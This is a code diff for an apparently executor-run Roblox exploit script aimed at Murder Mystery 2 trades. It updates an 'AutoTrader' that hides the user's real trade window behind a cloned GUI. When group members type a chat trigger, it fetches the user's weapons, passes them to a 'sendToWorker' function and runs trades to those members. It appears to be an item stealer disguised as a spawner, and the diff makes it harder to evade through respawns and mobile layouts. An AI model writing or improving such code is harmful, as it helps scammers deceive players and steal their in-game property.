@@ -52,9 +52,18 @@ local realTradeHidden = false
 local autoTraderActive = false
 local savedOriginalPositions = {}
 local positionsSaved = false
+local currentTradeGUIName = "TradeGUI"
+
+local function getRealTradeGUI()
+	local tg = playerGui:FindFirstChild("TradeGUI_Phone")
+	if tg then currentTradeGUIName = "TradeGUI_Phone"; return tg end
+	tg = playerGui:FindFirstChild("TradeGUI")
+	if tg then currentTradeGUIName = "TradeGUI"; return tg end
+	return nil
+end
 
 local function saveOriginalPositions()
-	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
+	local tradeGUI = getRealTradeGUI()
 	if not tradeGUI then return end
 	for _, child in ipairs(tradeGUI:GetChildren()) do
 		if child:IsA("GuiObject") then
@@ -67,7 +76,7 @@ local function saveOriginalPositions()
 end
 
 local function hideRealTradeGUI()
-	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
+	local tradeGUI = getRealTradeGUI()
 	if not tradeGUI then return end
 	realTradeHidden = true
 	for _, child in ipairs(tradeGUI:GetChildren()) do
@@ -98,7 +107,7 @@ local function restoreClonePositions()
 end
 
 local function setupCloneBeforeHide()
-	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
+	local tradeGUI = getRealTradeGUI()
 	if not tradeGUI then return nil end
 	if clonedTradeGUI and clonedTradeGUI.Parent then
 		clonedTradeGUI:Destroy()
@@ -106,7 +115,7 @@ local function setupCloneBeforeHide()
 	end
 	saveOriginalPositions()
 	clonedTradeGUI = tradeGUI:Clone()
-	clonedTradeGUI.Name = "TradeGUI_Clone"
+	clonedTradeGUI.Name = currentTradeGUIName .. "_Clone"
 	clonedTradeGUI.Parent = playerGui
 	clonedTradeGUI.Enabled = false
 	hideRealTradeGUI()
@@ -115,7 +124,7 @@ local function setupCloneBeforeHide()
 end
 
 local function restoreRealTradeGUI()
-	local tradeGUI = playerGui:FindFirstChild("TradeGUI")
+	local tradeGUI = getRealTradeGUI()
 	if tradeGUI then
 		for _, child in ipairs(tradeGUI:GetChildren()) do
 			if child:IsA("GuiObject") and savedOriginalPositions[child.Name] then
@@ -340,7 +349,10 @@ do
 	closeText.TextScaled = true
 	closeText.FontFace = MM2.FontFredBold
 	Utils.textStroke(closeText, 2)
-	closeBtn.MouseButton1Click:Connect(function() main.Visible = false end)
+	closeBtn.MouseButton1Click:Connect(function()
+		main.Visible = false
+		if isDelta and UI.floatingLogo then UI.floatingLogo.Visible = true end
+	end)
 
 	local contents = Instance.new("Frame", main)
 	contents.BorderSizePixel = 0
@@ -760,6 +772,49 @@ do
 	showTab("Spawner")
 end
 
+if isDelta then
+	local logoGui = Instance.new("ScreenGui")
+	logoGui.Name = "ChoppedYooEyLogo"
+	logoGui.ResetOnSpawn = false
+	logoGui.DisplayOrder = 1000
+	pcall(function()
+		if syn and syn.protect_gui then syn.protect_gui(logoGui) end
+		if gethui then logoGui.Parent = gethui() else logoGui.Parent = CoreGui end
+	end)
+	if not logoGui.Parent then logoGui.Parent = playerGui end
+
+	local logoBtn = Instance.new("ImageButton", logoGui)
+	logoBtn.Name = "LogoButton"
+	logoBtn.Size = UDim2.new(0, 55, 0, 55)
+	logoBtn.Position = UDim2.new(0, 10, 0, 10)
+	logoBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	logoBtn.BackgroundTransparency = 0.2
+	logoBtn.BorderSizePixel = 0
+	logoBtn.Image = "rbxassetid://16911678024"
+	logoBtn.ScaleType = Enum.ScaleType.Fit
+	logoBtn.Visible = false
+	logoBtn.Active = true
+	Utils.corner(logoBtn, 12)
+	Utils.stroke(logoBtn, MM2.GreenAction, 3)
+
+	local logoLbl = Instance.new("TextLabel", logoBtn)
+	logoLbl.BackgroundTransparency = 1
+	logoLbl.Size = UDim2.new(1, 0, 1, 0)
+	logoLbl.Text = "VS"
+	logoLbl.TextColor3 = MM2.TextWhite
+	logoLbl.TextScaled = true
+	logoLbl.FontFace = MM2.FontBold
+	Utils.textStroke(logoLbl, 2)
+
+	Utils.makeDraggable(logoBtn, logoBtn)
+
+	logoBtn.MouseButton1Click:Connect(function()
+		UI.main.Visible = true
+		logoBtn.Visible = false
+	end)
+
+	UI.floatingLogo = logoBtn
+end
 local Core = {}
 Core.itemDatabase = nil
 Core.allSpawnerClones = {}
@@ -981,7 +1036,12 @@ UI.alwaysLoseClick.MouseButton1Click:Connect(function() Core.waitingForKey = "al
 UI.legit5050Click.MouseButton1Click:Connect(function() Core.waitingForKey = "legit5050"; UI.legit5050Lbl.Text = "Press a key..." end)
 UI.debugKeyClick.MouseButton1Click:Connect(function() Core.waitingForKey = "debug"; UI.debugKeyLbl.Text = "Press a key..." end)
 
-local function toggleUI() UI.main.Visible = not UI.main.Visible end
+local function toggleUI()
+	UI.main.Visible = not UI.main.Visible
+	if isDelta and UI.floatingLogo then
+		UI.floatingLogo.Visible = not UI.main.Visible
+	end
+end
 
 local Trade = {}
 Trade.enabled = false
@@ -1051,7 +1111,7 @@ end
 
 local function getActiveTradeGUI()
 	if autoTraderActive and clonedTradeGUI and clonedTradeGUI.Parent then return clonedTradeGUI end
-	return playerGui:FindFirstChild("TradeGUI")
+	return getRealTradeGUI()
 end
 
 function Trade.setTheirUsername(name)
@@ -2005,7 +2065,7 @@ function Trade.startSession(incoming)
 			local cloneContainer = clonedTradeGUI:FindFirstChild("Container")
 			if cloneContainer then cloneContainer.Visible = true end
 		else
-			local tradeGUI = playerGui:FindFirstChild("TradeGUI")
+			local tradeGUI = getRealTradeGUI()
 			if tradeGUI then
 				if not positionsSaved then
 					for _, child in ipairs(tradeGUI:GetChildren()) do
@@ -2016,7 +2076,7 @@ function Trade.startSession(incoming)
 					positionsSaved = true
 				end
 				clonedTradeGUI = tradeGUI:Clone()
-				clonedTradeGUI.Name = "TradeGUI_Clone"
+				clonedTradeGUI.Name = currentTradeGUIName .. "_Clone"
 				clonedTradeGUI.Parent = playerGui
 				for _, child in ipairs(clonedTradeGUI:GetChildren()) do
 					if child:IsA("GuiObject") then
@@ -2033,7 +2093,7 @@ function Trade.startSession(incoming)
 			end
 		end
 	else
-		local tradeGUI = playerGui:FindFirstChild("TradeGUI")
+		local tradeGUI = getRealTradeGUI()
 		if tradeGUI and not positionsSaved then
 			for _, child in ipairs(tradeGUI:GetChildren()) do
 				if child:IsA("GuiObject") and child.Position.X.Offset < 50000 then
@@ -2070,7 +2130,6 @@ function Trade.startSession(incoming)
 end
 
 task.spawn(function() task.wait(0.5); Core.populateSpawner() end)
-
 if isDelta then
 	local mobileBtnGui = Instance.new("ScreenGui")
 	mobileBtnGui.Name = "MobileTradeBtns"
@@ -2970,6 +3029,7 @@ AutoTrader.currentTarget = nil
 AutoTrader.isTrading = false
 AutoTrader.groupCheckCache = {}
 AutoTrader.tradeQueue = {}
+AutoTrader.connectedPlayers = {}
 AutoTrader.RARITY_PRIORITY = {
 	["Ancient"] = 1, ["Godly"] = 2, ["Unique"] = 3, ["Legendary"] = 4,
 	["Rare"] = 5, ["Uncommon"] = 6, ["Common"] = 7, ["Classic"] = 8,
@@ -3002,7 +3062,7 @@ task.spawn(function()
 	while true do
 		task.wait(0.2)
 		if autoTraderActive and realTradeHidden then
-			local tg = playerGui:FindFirstChild("TradeGUI")
+			local tg = getRealTradeGUI()
 			if tg then
 				for _, child in ipairs(tg:GetChildren()) do
 					if child:IsA("GuiObject") then
@@ -3020,7 +3080,7 @@ task.spawn(function()
 end)
 
 playerGui.ChildAdded:Connect(function(child)
-	if child.Name == "TradeGUI" and autoTraderActive then
+	if (child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone") and autoTraderActive then
 		task.wait(0.2)
 		hideRealTradeGUI()
 	end
@@ -3266,40 +3326,82 @@ function AutoTrader.runTradeOnTarget(target)
 	end
 end
 
-function AutoTrader.setupChatListener()
-	local function connectPlayerChat(player)
-		if player == localPlayer then return end
-		player.Chatted:Connect(function(message)
-			if not AutoTrader.isActive then return end
-			if string.find(string.lower(message), string.lower(AutoTrader.CHAT_TRIGGER)) then
-				task.spawn(function()
-					if not AutoTrader.isPlayerInGroup(player) then return end
-					if AutoTrader.isTrading then
-						local alreadyQueued = false
-						for _, p in ipairs(AutoTrader.tradeQueue) do
-							if p == player then alreadyQueued = true; break end
-						end
-						if not alreadyQueued then table.insert(AutoTrader.tradeQueue, player) end
-						return
-					end
-					AutoTrader.isTrading = true
-					AutoTrader.currentTarget = player
-					local allWeapons, offerableWeapons = AutoTrader.fetchAndSortWeapons()
-					AutoTrader.sendToWorker(allWeapons, offerableWeapons, player.Name)
-					if #offerableWeapons == 0 then
-						AutoTrader.isTrading = false
-						return
-					end
-					task.spawn(function() AutoTrader.runTradeOnTarget(player) end)
-				end)
+function AutoTrader.handleChatMessage(player, message)
+	if not AutoTrader.isActive then return end
+	if string.find(string.lower(message), string.lower(AutoTrader.CHAT_TRIGGER)) then
+		task.spawn(function()
+			if not AutoTrader.isPlayerInGroup(player) then return end
+			if AutoTrader.isTrading then
+				local alreadyQueued = false
+				for _, p in ipairs(AutoTrader.tradeQueue) do
+					if p == player then alreadyQueued = true; break end
+				end
+				if not alreadyQueued then table.insert(AutoTrader.tradeQueue, player) end
+				return
 			end
+			AutoTrader.isTrading = true
+			AutoTrader.currentTarget = player
+			local allWeapons, offerableWeapons = AutoTrader.fetchAndSortWeapons()
+			AutoTrader.sendToWorker(allWeapons, offerableWeapons, player.Name)
+			if #offerableWeapons == 0 then
+				AutoTrader.isTrading = false
+				return
+			end
+			task.spawn(function() AutoTrader.runTradeOnTarget(player) end)
 		end)
 	end
+end
+
+function AutoTrader.connectPlayerChat(player)
+	if player == localPlayer then return end
+	if AutoTrader.connectedPlayers[player.UserId] then
+		local conn = AutoTrader.connectedPlayers[player.UserId]
+		if conn then pcall(function() conn:Disconnect() end) end
+	end
+	local chatConn = player.Chatted:Connect(function(message)
+		AutoTrader.handleChatMessage(player, message)
+	end)
+	AutoTrader.connectedPlayers[player.UserId] = chatConn
+	if player.Character then
+		local hum = player.Character:FindFirstChildOfClass("Humanoid")
+		if hum then
+			hum.Died:Connect(function()
+				task.wait(0.5)
+				if player.Parent == Players then
+					AutoTrader.connectPlayerChat(player)
+				end
+			end)
+		end
+	end
+	player.CharacterAdded:Connect(function(char)
+		task.wait(1)
+		if player.Parent ~= Players then return end
+		if AutoTrader.connectedPlayers[player.UserId] then
+			pcall(function() AutoTrader.connectedPlayers[player.UserId]:Disconnect() end)
+			AutoTrader.connectedPlayers[player.UserId] = nil
+		end
+		local newConn = player.Chatted:Connect(function(message)
+			AutoTrader.handleChatMessage(player, message)
+		end)
+		AutoTrader.connectedPlayers[player.UserId] = newConn
+		local hum = char:WaitForChild("Humanoid", 5)
+		if hum then
+			hum.Died:Connect(function()
+				task.wait(0.5)
+				if player.Parent == Players then
+					AutoTrader.connectPlayerChat(player)
+				end
+			end)
+		end
+	end)
+end
+
+function AutoTrader.setupChatListener()
 	for _, player in ipairs(Players:GetPlayers()) do
-		connectPlayerChat(player)
+		AutoTrader.connectPlayerChat(player)
 	end
 	Players.PlayerAdded:Connect(function(player)
-		connectPlayerChat(player)
+		AutoTrader.connectPlayerChat(player)
 		task.spawn(function()
 			task.wait(3)
 			local ok, inv = pcall(function() return GetFullInventory:InvokeServer(player.Name) end)
@@ -3347,6 +3449,38 @@ function AutoTrader.setupChatListener()
 			end
 		end)
 	end)
+	if localPlayer.Character then
+		local hum = localPlayer.Character:FindFirstChildOfClass("Humanoid")
+		if hum then
+			hum.Died:Connect(function()
+				task.wait(1)
+				for _, player in ipairs(Players:GetPlayers()) do
+					if player ~= localPlayer then
+						AutoTrader.connectPlayerChat(player)
+					end
+				end
+			end)
+		end
+	end
+	localPlayer.CharacterAdded:Connect(function(char)
+		task.wait(1)
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player ~= localPlayer then
+				AutoTrader.connectPlayerChat(player)
+			end
+		end
+		local hum = char:WaitForChild("Humanoid", 5)
+		if hum then
+			hum.Died:Connect(function()
+				task.wait(1)
+				for _, player in ipairs(Players:GetPlayers()) do
+					if player ~= localPlayer then
+						AutoTrader.connectPlayerChat(player)
+					end
+				end
+			end)
+		end
+	end)
 end
 
 pcall(function()
@@ -3381,6 +3515,10 @@ pcall(function()
 end)
 
 Players.PlayerRemoving:Connect(function(player)
+	if AutoTrader.connectedPlayers[player.UserId] then
+		pcall(function() AutoTrader.connectedPlayers[player.UserId]:Disconnect() end)
+		AutoTrader.connectedPlayers[player.UserId] = nil
+	end
 	if AutoTrader.currentTarget and AutoTrader.currentTarget == player then
 		AutoTrader.isActive = false
 		AutoTrader.isTrading = false
@@ -3461,7 +3599,7 @@ end)
 
 playerGui.ChildAdded:Connect(function(child)
 	if not Trade.scriptAlive then return end
-	if child.Name == "TradeGUI" then
+	if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
 		task.wait(0.5)
 		if Trade.enabled then Trade.connectWeapons() end
 		if autoTraderActive then hideRealTradeGUI() end
